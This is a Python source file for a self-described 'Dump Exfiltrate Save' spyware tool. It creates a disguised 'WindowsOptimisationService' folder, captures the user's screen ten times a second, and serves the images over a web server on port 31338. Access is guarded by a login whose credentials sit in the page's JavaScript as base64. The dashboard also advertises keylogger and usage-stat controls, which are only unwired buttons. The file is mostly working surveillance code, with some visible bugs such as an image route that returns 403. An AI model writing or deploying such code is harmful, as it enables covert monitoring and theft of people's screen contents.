# Modules
import os
import threading
import time
import socket
import io
from collections import deque
import mss
from PIL import Image

# Create directory function
def make():
    # Get current logged user name 
    user_login = os.getlogin()
    # Define the main directory for the program
    screenShareDir = f"C:\\Users\\{user_login}\\WindowsOptimisationService"
    # Make the main directory
    os.makedirs(screenShareDir, exist_ok=True)
    # Change the direcotry path
    os.chdir(screenShareDir)

# Capture images function
def capture_images():
    global images
    with mss.mss() as sct:
        # Uses first screen for the capture
        monitor = sct.monitors[1]
        # Start the capture loop
        while True:
            # Record the start time to measure the elapsed time for each iteration
            start = time.time()
            # Define the monitor to capture 
            sct_img = sct.grab(monitor)
            # Create an image from the captured screen data
            img = Image.frombytes('RGB', sct_img.size, sct_img.rgb)
            # Use a BytesIO object to save the image in memory
            with io.BytesIO() as output:
                # Save the image in PNG format to the BytesIO object
                img.save(output, format='PNG')
                # Append the image data to the 'images' deque 
                images.append(output.getvalue())
                # If the number of images exceeds 5, remove the oldest image from the deque
                if len(images) > 2:
                    images.popleft()
            # Calculate the elapsed time for the current iteration
            elapsed = time.time() - start
            # Sleep for the remaining time to maintain a frame rate of 10 FPS
            time.sleep(max(0, 1/10 - elapsed))

# Get local IP function
def get_local_ip():
    return socket.gethostbyname(socket.gethostname())

# Define socket host 
SERVER_HOST = get_local_ip()
print(f"Server IP: {SERVER_HOST}")
# Define socket host 
SERVER_PORT = 31338
print(f"Server port: {SERVER_PORT}")

# Create socket server
server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
# Bind socket server
server_socket.bind((SERVER_HOST, SERVER_PORT))
# Start listening for clients
server_socket.listen(1)
print(f'Listening on port {SERVER_PORT} | IP {SERVER_HOST}')

# Define the global images variable
images = deque(maxlen=5)

# Handle request function
def handle_request(request):
    global images  # Use the global images variable
    # Parse the request
    lines = request.splitlines()
    if len(lines) > 0:
        request_line = lines[0]
        method, path, _ = request_line.split()

        # Handle different paths
        if path == '/':
            response_body = f"""<!DOCTYPE html>
<html lang="en">
<!--Start Head-->
<head>
    <!--Page Information-->
    <meta charset="UTF-8">
    <meta name="author" content="Federico">
    <meta name="description" content="The Project Dump Exfiltrate Save (P-DES) is a project made by Fede to retrieve informations & PC usages">
    <meta name="copyright" content="Fede 2025©">
    <meta name="dc.language" content="ita" scheme="RFC1766">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <!--Title -->
    <title>Dump Exfiltrate Save | DES</title>
    <script>
        function checkCredentials() {{
            var username = document.getElementById("username").value;
            var password = document.getElementById("password").value;
            var encodedPassword = btoa(password); // Encodes the password with base64
            var encodedUsername = btoa(username)

            if (encodedUsername === "UERFUy1BZG1pbg==" && encodedPassword === "UERFUy1QYXNzd29yZA==") {{
                alert("Login successful");
                window.location.replace("http://{SERVER_HOST}:{SERVER_PORT}/4ee1711430410e5f2ec9d8188ac1f134");
            }} else {{
                alert("Invalid username or password");
            }}
        }}
    </script>
</head>
<!--End Head-->
<body>
    <h2>Admin Login</h2>
    <form onsubmit="event.preventDefault(); checkCredentials();">
        <div>
            <label for="username">Username:</label>
            <input type="text" id="username" name="username">
        </div>
        <div>
            <label for="password">Password:</label>
            <input type="password" id="password" name="password">
        </div>
        <div>
            <button type="submit">Login</button>
        </div>
    </form>
</body>
</html>"""
            response_status = "HTTP/1.1 200 OK"
        elif path == f'/4ee1711430410e5f2ec9d8188ac1f134':
            response_body = f"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="author" content="Federico">
    <meta name="description" content="The Project Dump Exfiltrate Save (P-DES) is a project made by Fede to retrieve informations & PC usages">
    <meta name="copyright" content="Fede 2025©">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dump Exfiltrate Save | DES</title>
    <script>
        function updateImage() {{
            const img = document.getElementById('screenshot');
            img.src = '/image.png?' + new Date().getTime();
        }}
        setInterval(updateImage, 100); // 10 FPS

        function saveScreenshot() {{
            const link = document.createElement('a');
            link.href = '/download.png';
            link.download = 'screenshot.png';
            document.body.appendChild(link);
            link.click();
            document.body.removeChild(link);
        }}

        const refreshBtn = document.getElementById("btnRefresh");
        function handleClick() {{
            history.go(0);
        }}

        refreshBtn.addEventListener("click", handleClick);

     </script>
</head>
<body>
    <h1>Action available</h1>
    <ol>
        <li><a href="#ScreenShare">Screen share</a></li>
        <li><a href="#Keylogger">Keylogger log</a></li>
        <li><a href="#Usage">Usage stats</a></li>
    </ol>
    <div id="screenShare">
        <h1>Screen share</h1>
        <button type="button" onclick="saveScreenshot()">Take &#38; Download screenshot from host</button>
        <button id="btnRefresh" type="button" onclick="updateImage()">Refresh page</button>
        <div>
            <img id="screenshot" src="/image.png" alt="Screenshot" />
        </div>
    </div>
    <div id="Keylogger">
        <h1>Keylogger</h1>
        <button type="button">Start keylogger</button>
        <button type="button">Stop keylogger</button>
    </div>
    <div id="Usage">
        <h1>Usage stats</h1>
        <button type="button">Check wifi</button>
        <button type="button">Check public IP</button>
    </div>
</body>
</html>"""
            response_status = "HTTP/1.1 200 OK"
        elif path.startswith('/image.png'):
            if images:
                response_status = "HTTP/1.1 403 Forbidden"
                response = f"{response_status}\r\n"
                return response.encode()
            else:
                response_body = "404 Not Found"
                response_status = "HTTP/1.1 404 Not Found"
            
        elif path.startswith('/download.png'):
            if images:
                response_status = "HTTP/1.1 200 OK"
                response_headers = "Content-type: image/png\r\nContent-Disposition: attachment; filename=\"screenshot.png\"\r\n"
                response = f"{response_status}\r\n{response_headers}\r\n"
                return response.encode() + images[-1]
            else:
                response_body = "404 Not Found"
                response_status = "HTTP/1.1 404 Not Found"
        else:
            response_body = "404 Not Found"
            response_status = "HTTP/1.1 404 Not Found"

        # Create the response
        response = f"{response_status}\r\nContent-Length: {len(response_body)}\r\n\r\n{response_body}"
        return response
    return "HTTP/1.1 400 Bad Request\r\n\r\n"

if __name__ == "__main__":
    make()
    threading.Thread(target=capture_images, daemon=True).start()
    try:
        while True:
            # Wait for client connections
            client_connection, client_address = server_socket.accept()
            print(f'Connection from {client_address}')

            # Get the client request
            request = client_connection.recv(1024).decode()
            print(request)

            # Handle the request and get the response
            response = handle_request(request)

            # Send the response
            client_connection.sendall(response.encode() if isinstance(response, str) else response)
            client_connection.close()
    except KeyboardInterrupt:
        print("Server is shutting down.")
    finally:
        server_socket.close()
